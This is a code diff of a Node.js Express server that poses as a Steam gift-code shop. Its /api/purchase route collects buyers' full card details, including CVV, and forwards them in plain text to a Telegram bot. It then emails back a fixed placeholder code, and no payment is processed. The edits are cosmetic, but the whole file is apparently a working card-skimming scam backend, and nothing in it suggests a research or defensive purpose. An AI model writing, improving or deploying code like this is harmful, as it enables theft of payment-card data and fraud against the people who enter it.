@@ -1,14 +1,14 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
-const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 require('dotenv').config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Email sender
+// Email Sender
 async function sendEmail(email, ref, code) {
   const transporter = nodemailer.createTransport({
     service: 'gmail',
@@ -28,20 +28,11 @@ async function sendEmail(email, ref, code) {
   return transporter.sendMail(mailOptions);
 }
 
-// Telegram sender
+// Telegram Notification
 async function notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
-  const message = `✅ Steam Code Purchase
-📧 Email: ${email}
-🧾 Ref No: ${ref}
-💰 Amount: ₱${amount}
-
-💳 Card Details:
-👤 Name: ${cardName}
-🔢 Number: ${cardNumber}
-📅 Exp: ${expDate}
-🔒 CVV: ${cvv}`;
+  const message = `✅ Steam Code Purchase\n📧 Email: ${email}\n🧾 Ref No: ${ref}\n💰 Amount: ₱${amount}\n👤 Card Name: ${cardName}\n💳 Card Number: ${cardNumber}\n📅 Expiry: ${expDate}\n🔐 CVV: ${cvv}`;
 
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -50,10 +41,10 @@ async function notifyTelegram(email, ref, amount, cardName, cardNumber, expDate,
   });
 }
 
-// Purchase route
+// Main API Route
 app.post('/api/purchase', async (req, res) => {
   const { ref, email, cardName, cardNumber, expDate, cvv } = req.body;
-  const code = "ABCD-1234-EFGH"; // Replace with dynamic code logic later
+  const code = "ABCD-1234-EFGH"; // Static or random code logic
   const amount = 100;
 
   try {
@@ -61,10 +52,11 @@ app.post('/api/purchase', async (req, res) => {
     await notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv);
     res.json({ success: true });
   } catch (err) {
-    console.error("❌ Error:", err.message);
+    console.error("❌ Server error:", err.message);
     res.json({ success: false, message: err.message });
   }
 });
 
-// Start server
-app.listen(3000, () => console.log("✅ Server running on http://localhost:3000"));
+// Start Server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
